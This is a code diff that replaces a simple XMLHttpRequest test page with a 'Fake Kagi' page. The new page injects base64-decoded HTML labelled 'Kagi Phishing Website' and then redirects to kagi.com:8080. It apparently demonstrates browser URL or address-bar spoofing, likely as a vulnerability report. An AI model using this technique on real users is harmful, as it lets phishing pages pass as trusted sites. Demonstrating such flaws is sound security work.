@@ -1,28 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Orion Cross Test</title>
-    <script>
-      
-
-        // Test function to make an HTTP request
-        function triggerOrionCross() {
-            const xhr = new XMLHttpRequest();
-            xhr.open("GET", "https://jsonplaceholder.typicode.com/posts/1", true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    console.log("Request completed with status:", xhr.status);
-                }
-            };
-            xhr.send();
-        }
-    </script>
-</head>
+<html>
+<title>Fake Kagi</title>
 <body>
-    <h1>Orion Cross Trigger Test</h1>
-    <button onclick="triggerOrionCross()">Trigger XMLHttpRequest</button>
-    <p>Open the console to see the modified URL with "orion-cross" if triggered.</p>
+<script>
+function spoof()
+{
+var data =
+'PGh0bWw+PGJvZHk+PGgxIGFsaWduPSJjZW50ZXIiPkthZ2kgUGhpc2hpbmcgV2Vic2l0ZTwvaDE+PC9ib2R5PjwvaHRtbD4='; // base64 encoded html content
+document.body.innerHTML=atob(data);
+window.location.assign("https://www.kagi.com:8080");
+}
+setInterval(spoof(),100000);
+</script>
+</script>
 </body>
 </html>
